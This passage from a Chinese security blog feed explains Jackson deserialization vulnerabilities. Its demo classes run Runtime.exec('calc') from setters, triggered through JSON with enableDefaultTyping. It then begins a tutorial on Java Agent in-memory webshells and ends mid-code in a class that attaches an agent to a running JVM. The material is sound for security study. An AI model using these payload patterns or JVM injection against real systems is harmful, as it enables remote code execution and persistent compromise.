反序列化漏洞。当然这种场景开发几乎不会这么写。</strong></p><p>我们看个例子，直接修改 MySex 类的 setSex ()方法，在其中添加命令执行操作（除非程序员自己想留后门、不然不会出现这种写法）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Peson3 类不变</p><p>编写反序列化类，构造 Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationRun</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.JacksonVul.EvilSex\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="属性为-Object-类时"><a href="#属性为-Object-类时" class="headerlink" title="属性为 Object 类时"></a>属性为 Object 类时</h4><p><strong>当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。</strong></p><p>后面出现的 Jackson 反序列化的 CVE 漏洞、黑名单绕过等都是基于这个原理寻找各种符合条件的利用链。</p><p>我们编写一个存在漏洞的代码</p><p><strong>Evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;  </span><br><span class="line">    String cmd;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Person4.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person4</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  </span></span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)    public Object object;  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person4</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 setter 函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着编写反序列化代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationObjectRun</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;object\&quot;:[\&quot;com.drunkbaby.JacksonVul.Evil\&quot;,&#123;\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person4</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person4.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/calc2.png" class><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>概念虽然多，但是自己跟一下代码，看起来还是非常快的。总而言之就是开启了特殊的反序列化解析方式时，会调用任意的构造函数与 setter 方法</p><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">Jackson 反序列化漏洞原理</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java Agent 内存马学习</title>
    <link href="https://drun1baby.github.io/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://drun1baby.github.io/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-12-07T12:05:37.000Z</published>
    <updated>2023-12-07T12:41:10.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是-Java-Agent？"><a href="#什么是-Java-Agent？" class="headerlink" title="什么是 Java Agent？"></a>什么是 Java Agent？</h2><p>我们知道Java是一种静态强类型语言，在运行之前必须将其编译成<code>.class</code>字节码，然后再交给JVM处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改 Java 字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？</p><p>对于 Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的<code>premain-Agent</code>，另一种是 JVM 启动之后加载的 <code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的 Interceptor（拦截器），如下图。</p><p><strong>Premain-Agent</strong></p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/PreAgent.png" class><p><strong>agentmain-Agent</strong></p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmain-Agent.png" class><h2 id="几种-Java-Agent-实例"><a href="#几种-Java-Agent-实例" class="headerlink" title="几种 Java Agent 实例"></a>几种 Java Agent 实例</h2><h3 id="premain-Agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h3><p>从官方文档中可知晓，首先我们必须实现 premain 方法，同时我们 jar 文件的清单（mainfest）中必须要含有 Premain-Class 属性</p><p>我们可在命令行利用 <strong>-javaagent</strong> 来实现启动时加载。</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/premain.png" class><p>premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法</p><p>我们首先来实现一个简单的 <code>premain-Agent</code>，创建一个 Maven 项目，编写一个简单的 <code>premain-Agent</code>，创建的类需要实现 premain 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在 <code>resource/META-INF/</code> 下创建 <code>agent.MF</code> 清单文件用以指定 <code>premain-Agent</code> 的启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br></pre></td></tr></table></figure><p>接着用 jar 命令来打包，此时并指定启动项。运行完命令之后将会生成 agent.jar 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class</span><br></pre></td></tr></table></figure><p>接着创建一个目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，创建对应的 mf 启动项，取名为 <code>hello.mf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Main-Class: Hello</span><br></pre></td></tr></table></figure><p>同样的打包方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm hello.jar META-INF/maven/hello.mf Hello.class</span><br></pre></td></tr></table></figure><p>至此我们的准备工作已经做完了，最终得到了 agent.jar 和 hello.jar</p><p>接下来我们只需要在 <code>java -jar</code> 中添加 <code>-javaagent:agent.jar</code> 即可在启动时优先加载 agent , 而且可利用如下方式获取传入我们的 agentArgs 参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:agent.jar=Hello -jar hello.jar</span><br></pre></td></tr></table></figure><p>可以看到我们 agent 中 premain 的代码被优先执行了</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentSuccess.png" class><ul><li>以上就是 Premain-Agent 的工作实例</li></ul><h3 id="agentmain-Agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h3><p>相较于 premain-Agent 只能在 JVM 启动前加载，agentmain-Agent 能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和 JVM 有关的两个类。</p><h4 id="VirtualMachine类"><a href="#VirtualMachine类" class="headerlink" title="VirtualMachine类"></a>VirtualMachine类</h4><p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>该类允许我们通过给 attach 方法传入一个 JVM 的 PID，来远程连接到该 JVM 上 ，之后我们就可以对连接的 JVM 进行各种操作，如注入 Agent。下面是该类的主要方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获得当前所有的JVM列表</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//解除与特定JVM的连接</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure><h4 id="VirtualMachineDescriptor-类"><a href="#VirtualMachineDescriptor-类" class="headerlink" title="VirtualMachineDescriptor 类"></a>VirtualMachineDescriptor 类</h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.drunkbaby.get_PID&quot;</span>))  </span><br><span class="line">                System.out.println(vmd.id());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/JVMAttach.png" class><p>下面我们就来实现一个<code>agentmain-Agent</code>。首先我们编写一个 <code>Sleep_Hello</code> 类，模拟正在运行的 JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sleep_Hello</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">            sleep(<span class="number">5000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写我们的 agentmain-Agent 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;调用了agentmain-Agent!&quot;</span>);  </span><br><span class="line">            sleep(<span class="number">3000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时配置 agentmain.mf 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.drunkbaby.Java_Agent_agentmain</span><br></pre></td></tr></table></figure><p>接着，编译打包成 jar 文件</p><p>打包成 jar 包的方式建议是在 pom.xml 当中添加以下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">archive</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">            src/main/resources/META-INF/MAINFEST.MF  </span><br><span class="line">          <span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">archive</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>6<span class="tag">&lt;/<span class="name">source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>6<span class="tag">&lt;/<span class="name">target</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着用 <code>mvn:assembly</code> 命令打包成 jar 包即可</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmainBuild.png" class><p>获取2个 jar 包，我们需要的是第二个，随后我们设置 <strong>VM-OPTIONS</strong> (最大的坑），这个 vm-options 在新版 UI 里默认是隐藏了起来的，所以你要把他打开，否则你很容易把它和变量列表搞混：</p><p>最后准备一个 Inject 类，将我们的 agent-main 注入目标 JVM：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.drunkbaby.Sleep_Hello&quot;</span>))&#123;  